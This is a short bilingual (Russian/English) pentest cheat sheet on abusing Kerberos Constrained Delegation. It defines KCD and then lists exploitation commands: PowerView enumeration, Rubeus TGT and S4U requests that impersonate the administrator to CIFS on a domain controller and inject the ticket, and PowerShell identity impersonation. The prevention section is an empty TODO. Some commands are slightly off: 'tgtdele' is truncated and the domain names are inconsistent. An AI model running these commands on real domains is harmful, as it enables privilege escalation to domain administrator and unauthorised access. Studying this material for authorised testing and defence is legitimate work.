# Kerberos Constrained Delegation

## What is this RU 

**Kerberos Constrained Delegation (KCD)** -  это механизм, используемый в сетевой аутентификации Kerberos, который позволяет делегировать права доступа от одного компьютера к другому в рамках одного доверенного домена.

## What is this EN 

**Kerberos Constrained Delegation (KCD)** - is a mechanism used in the Kerberos network authentication protocol that allows delegating access rights from one computer to another within a single trusted domain.

## Explotation 

Check delegation with PowerView
```
Get-NetUser -TrustedToAuth
```

Request TGT 
```
.\Rubeus.exe tgtdele
```

Using Rubeus to TGS from admin, who will be alowed to auth to CIFS/dc
```
.\Rubeus.exe s4u /ticket:base64ticket /impersonateuser:administrator /domain:offense.local /msdsspn:cifs/dc01.domain.local /dc:dc01.domain.local /ptt
```

Let's now impersonate administrator@domain.local and try again:
```
[Reflection.Assembly]::LoadWithPartialName('System.IdentityModel') | out-null
$idToImpersonate = New-Object System.Security.Principal.WindowsIdentity @('administrator')
$idToImpersonate.Impersonate()
[System.Security.Principal.WindowsIdentity]::GetCurrent() | select name
```

## TODO Prevent
